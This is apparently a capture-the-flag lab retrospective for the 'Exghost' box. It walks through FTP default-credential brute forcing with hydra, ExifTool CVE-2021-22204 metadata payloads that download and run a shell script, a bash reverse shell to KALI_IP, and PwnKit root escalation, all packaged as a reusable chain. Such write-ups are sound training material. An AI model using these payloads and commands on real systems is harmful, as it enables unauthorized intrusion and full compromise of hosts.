title: Exghost Retrospective — Five Lessons from a Clean File-Upload Chain
body:
Exghost was a textbook image-upload-RCE → www-data → PwnKit → root chain. Two CVEs, both well-documented, both in linpeas's auto-detection. The methodology worked end-to-end but several specific decisions made the difference between 'cleanly executed in 90 minutes' and 'spent 4 hours on debugging the wrong layer.'

Final proof: 226f01aac1529cf200176664c0edbc64

— THE FOOTHOLD CHAIN — IN ORDER —

  1. Nmap → ports 21 (vsftpd 3.0.3) + 80 (Apache 403)
  2. Anonymous FTP failed → hydra -C ftp-betterdefaultpasslist.txt
     → user:system
  3. FTP login → backup file (no /backup directory; the file was just 'backup')
  4. backup file = HTTP request capture of /exiftest.php — disclosed:
       - Endpoint: /exiftest.php
       - Form field: myFile (multipart/form-data)
       - ExifTool version: 12.23 (vulnerable)
       - Upload path: /var/www/html/uploads
  5. CVE-2021-22204 ExifTool RCE → www-data shell
  6. linpeas → annotated pkexec as Generic_CVE-2021-4034 vulnerable
  7. PwnKit → root in 30 seconds

— FIVE LESSONS —

  1. ALWAYS TEST RCE WITH PING + TCPDUMP BEFORE CHASING SHELLS
     This was the single most valuable methodology call on Exghost.
     Before crafting any reverse shell payload, verify:
       (a) RCE actually fires
       (b) Target can route back to your Kali
     The test:
       payload: (metadata "\c${system('ping -c 3 KALI_IP')};")
       Kali: sudo tcpdump icmp -i tun0
     30 seconds tells you both things at once. If ping doesn't arrive,
     no reverse shell will work either — diagnosing 'no shell' is much
     harder than diagnosing 'no ping.'
     This applies to ANY new RCE primitive, not just exiftool. Always
     ping first. Always.

  2. TWO-STAGE PAYLOADS BEAT INLINE SHELLS
     First attempt at Exghost used a wget-only payload:
       payload: (metadata "\c${system('wget IP/shell -O /tmp/shell')};")
     HTTP server logged the GET, but no shell connected.
     Diagnosis: file downloaded, but never executed.
     Fix: the payload must download AND execute:
       payload: (metadata "\c${system('wget IP/shell -O /tmp/shell; bash /tmp/shell')};")
     The pattern:
       Stage 1 (in metadata, short, no special chars): wget + execute
       Stage 2 (on Kali HTTP, plain bash): the actual shell
     Why two-stage wins: escape-quoting hell goes away, you can iterate
     on the shell content without rebuilding the trojaned image.
     Apply this pattern to any file-upload-RCE: it generalizes.

  3. LINPEAS ANNOTATIONS ARE PRIVESC ROADMAP — READ THEM
     linpeas doesn't just list SUID binaries. It cross-references each
     one against known CVEs and tells you which exploits apply:
        /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
        /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/
                               rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
     'Generic_CVE-2021-4034' = PwnKit applies. That's the answer right
     there, no further enumeration needed.
     Lesson: don't just skim linpeas output for red highlights. Read the
     annotations on each finding. Half the privesc work is already done.

  4. HYDRA -C + ftp-betterdefaultpasslist IS A 60-SECOND WIN
     When anonymous FTP fails, run before anything else:
        hydra -C /usr/share/seclists/Passwords/Default-Credentials/
               ftp-betterdefaultpasslist.txt ftp://$ip
     The -C flag takes user:pass combos (one per line, colon-separated).
     SecLists' ftp-betterdefaultpasslist.txt has 60+ vendor defaults.
     Lab boxes regularly use these (Exghost: user:system).
     Same pattern works for SSH, telnet, pop3, etc. — wherever you have
     a service with a default-credentials wordlist available.
     Cost: 60 seconds. Gain: full credential bypass when it works.
     Always try it before deeper credential attacks.

  5. DOWNLOADED FILES OFTEN CONTAIN THE NEXT STEP — READ THEM
     The backup file from FTP was an HTTP request capture, not a tar
     archive. Reading it disclosed:
       - The vulnerable endpoint (/exiftest.php)
       - The exact form field name (myFile)
       - The vulnerable ExifTool version (12.23)
       - The upload path on disk
     Without reading that file carefully, you'd have to fuzz the endpoint
     and discover the field name through trial. Reading it: 5 minutes.
     Fuzzing it: 30+ minutes.
     Generalize: any file you grab from a target — backup, config, log,
     screenshot, source code — open it and read it before doing anything
     else. The next step is often disclosed there.

— THE REUSABLE FILE-UPLOAD-RCE CHAIN —

  When you see image upload + server-side processing on a lab box:

  1. Upload a clean image — confirm it accepts the file
  2. Check the response for tool fingerprints:
        ExifTool Version Number  : ...   → CVE-2021-22204 if <=12.23
        ImageMagick %[fx:...]            → CVE-2016-3714 (ImageTragick)
        GhostScript GS_DEVICE / GS_LIB   → various Ghostscript CVEs
  3. Match version → CVE → public PoC
  4. Test with ping payload before chasing shell
  5. Two-stage delivery for the actual shell
  6. Stabilize, run linpeas, read annotations, privesc

  This applies to any image-processing CVE class, not just ExifTool.
  The methodology is the asset; the specific CVE rotates.

— TIME BREAKDOWN — WHERE THE HOURS WENT —

  Real Exghost timing for reference:
    Recon (nmap, web enum, FTP):                ~30 min
    FTP brute force + backup file analysis:     ~15 min
    ExifTool payload construction (first time): ~45 min
    Ping test + reverse shell delivery:         ~20 min
    Stabilize + linpeas + PwnKit + root:        ~15 min
  Total: ~2 hours

  Future-self running this pattern again should take 30-45 minutes.
  The configfile is reusable. The PwnKit binary is reusable. The two-
  stage payload pattern is muscle memory after the first run.
cmd:
# ── REUSABLE EXGHOST-PATTERN CHAIN ───────────────────

# Stage 1: FTP recon when port 21 is open
nmap -sV -p21 $ip
ftp $ip                          # try anonymous first
# If anonymous fails:
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$ip

# Stage 2: download and READ everything
ftp $ip
# binary  (set transfer mode to binary BEFORE getting any file)
# get backup
# get *  (if directory listing was small)
# quit

# READ what you downloaded:
file backup                      # what kind of file is it?
cat backup                       # if text
hexdump -C backup | head -50     # if binary, look for headers
strings backup | head -100       # extract any text from binary

# Look specifically for:
#   HTTP requests/responses (reveal endpoints + parameters)
#   Source code (reveal vulnerabilities + paths)
#   Configuration files (reveal credentials + structure)
#   SSH keys, password hashes, API tokens

# Stage 3: Image upload RCE
# Once you've identified the upload endpoint and tool, see exiftool_rce node
# for full chain. Quick reminder of the canonical fingerprint signal:
curl -s -X POST -F myFile=@sample.png http://$ip/upload_endpoint | grep -i 'exiftool\|imagemagick\|ghostscript'

# Stage 4: Always ping-test RCE before chasing shells
# In one terminal:
sudo tcpdump icmp -i tun0
# In another, after triggering RCE:
# (target should ping back if RCE works AND target can route to you)

# Stage 5: Two-stage shell delivery
# Stage A (in payload): wget + execute
# Stage B (on Kali HTTP): the actual shell
cat > shell <<'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/KALI_IP/443 0>&1
EOF

sudo python3 -m http.server 80
rlwrap -cAr nc -nlvp 443

# Stage 6: Stabilize, enumerate, privesc
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color

# Get linpeas onto the target
# (linpeas is on Kali at /usr/share/peass/linpeas/linpeas.sh by default)
wget http://KALI_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out

# READ the annotations:
grep -A1 'CVE-' /tmp/linpeas.out | head -50
# Look for SUID lines with CVE annotations like:
#   /usr/bin/pkexec  --->  ...Generic_CVE-2021-4034
# That's PwnKit. See pwnkit node.

# Stage 7: Privesc — PwnKit if pkexec is annotated
wget http://KALI_IP/PwnKit -O /tmp/PwnKit
chmod +x /tmp/PwnKit
/tmp/PwnKit
whoami   # should be 'root'

# ── PRE-EXAM CHECKLIST FROM EXGHOST LESSONS ──────────

# Things to have ready BEFORE the exam clock starts:

# 1. Saved exiftool RCE config file:
mkdir -p ~/scripts/exiftool_rce
cat > ~/scripts/exiftool_rce/configfile <<'EOF'
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
    },
);
1;
EOF

# 2. PwnKit binary downloaded
mkdir -p ~/scripts/privesc
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O ~/scripts/privesc/PwnKit
chmod +x ~/scripts/privesc/PwnKit

# 3. linpeas downloaded (so you can serve it without internet)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O ~/scripts/privesc/linpeas.sh
chmod +x ~/scripts/privesc/linpeas.sh

# 4. Default credential lists indexed mentally
ls /usr/share/seclists/Passwords/Default-Credentials/
# Most useful:
#   ftp-betterdefaultpasslist.txt
#   ssh-betterdefaultpasslist.txt
#   default-passwords.csv
#   tomcat-betterdefaultpasslist.txt

# 5. Sample image staged
cp /var/lib/inetsim/http/fakefiles/sample.png ~/scripts/exiftool_rce/clean.png

# Total prep time: 5 minutes. Saves 30+ minutes during exam.

# ── PING TEST AS A UNIVERSAL RCE VERIFIER ────────────
# Drop this snippet into ANY new RCE you're testing:

# In one terminal (always running during exam):
sudo tcpdump icmp -i tun0 &

# In your exploit payload (whatever the format):
#   Bash:    ping -c 3 KALI_IP
#   Python:  os.system('ping -c 3 KALI_IP')
#   Perl:    system('ping -c 3 KALI_IP')
#   PHP:     <?php system('ping -c 3 KALI_IP'); ?>
#   PowerShell: ping -n 3 KALI_IP

# If ping doesn't arrive within 5 seconds:
#   - Check tun0 interface name (could be tap0, ens33, etc.)
#   - Check tun0 IP matches what's in your payload
#   - Check Kali firewall: sudo iptables -L OUTPUT
#   - Try TCP instead of ICMP: nc on listening port
# If it DOES arrive: RCE confirmed, proceed to reverse shell.
warn:
ALWAYS PING-TEST RCE — THIS IS THE LESSON THAT SAVES YOU TIME:
  Reverse shell payloads have many failure modes: bad IP in shell content,
  Kali firewall blocking port 443, target firewall blocking outbound,
  bash special character escaping, two-stage timing issues, etc.
  Ping-test isolates one variable: 'does code execution work and does
  the target route back to me'. If ping works, every other failure is
  a payload issue, not an RCE issue. If ping doesn't work, no payload
  variation will succeed.

READ WHAT YOU DOWNLOAD — DON'T JUST GREP FOR PASSWORDS:
  The Exghost backup file was a complete HTTP request capture. A grep
  for 'password' would find nothing. Reading the file revealed the
  vulnerable endpoint, the exact form field, the ExifTool version, and
  the upload directory — everything needed for the next step.
  When you grab a file from a target, ALLOCATE 5 MINUTES TO READ IT.
  More than half the time, the next step is in there.

LINPEAS IS NOT JUST FOR SCANNING — IT'S FOR DECISION-MAKING:
  Most operators run linpeas, scroll through, and hunt for red highlights.
  The annotations are doing more work than the highlights. Each SUID
  binary, each capability, each common file gets cross-referenced against
  CVEs that apply to that exact configuration. PwnKit on Exghost was
  literally named in the linpeas output — no further enumeration needed.
  Time spent learning to read linpeas annotations: 30 minutes.
  Time saved on every Linux box thereafter: hours.

DEFAULT CREDENTIALS BEFORE BRUTE FORCE — ALWAYS:
  Brute-forcing FTP with rockyou.txt: hours, often unsuccessful.
  hydra -C with ftp-betterdefaultpasslist.txt: 60 seconds.
  On lab boxes, the latter wins regularly. Build the muscle memory:
  ANY service with a SecLists default-credentials list, try -C first.

TWO-STAGE PAYLOADS GENERALIZE BEYOND EXIFTOOL:
  The pattern (Stage 1: wget + exec, Stage 2: real shell on Kali HTTP)
  works for:
    - File upload RCE (any kind)
    - SSTI exploitation
    - SQL injection xp_cmdshell on MSSQL
    - PHP webshell upload
    - Any RCE primitive with character/length constraints
  The principle: separate 'how the target gets the code' from 'what the
  code is.' Stage 1 is short and clean (just bash); Stage 2 is whatever
  you want without escape concerns.

KEEP CONFIGFILE AND POWNKIT IN ~/scripts/ FOREVER:
  These are tools you'll use every few months for years. Don't recreate
  them every time. Save the configfile, save the PwnKit binary, save
  linpeas.sh. Put them in ~/scripts/ or wherever your dotfiles live.
  When the exam is on the clock and you hit a familiar pattern, you
  want to scp from local cache, not wget over a possibly-slow VPN.

INTERMEDIATE SHELLS ARE NOT YOUR FINAL SHELL:
  When you first land www-data via exiftool RCE, that shell is fragile.
  Don't run linpeas in it. Don't run PwnKit in it. First stabilize:
    python3 -c 'import pty; pty.spawn("/bin/bash")'
  Then proceed. Trying to do work in an unstable shell loses you the
  shell halfway through and you have to re-establish it.

DON'T MEMORIZE EXPLOITS — MEMORIZE PATTERNS:
  CVE-2021-22204 will be irrelevant in 5 years (already patched in Ubuntu
  22.04). The pattern 'image upload + server-side metadata processing
  + version match → RCE' will be relevant forever. Same for 'pkexec
  SUID + unpatched polkit → root.' Future CVEs will fit the same shape.
  Learn the shape, not the specific bug.

choices.label: Apply ExifTool RCE chain on a new box
Apply PwnKit privesc on a new box
Apply two-stage payload pattern to other RCE
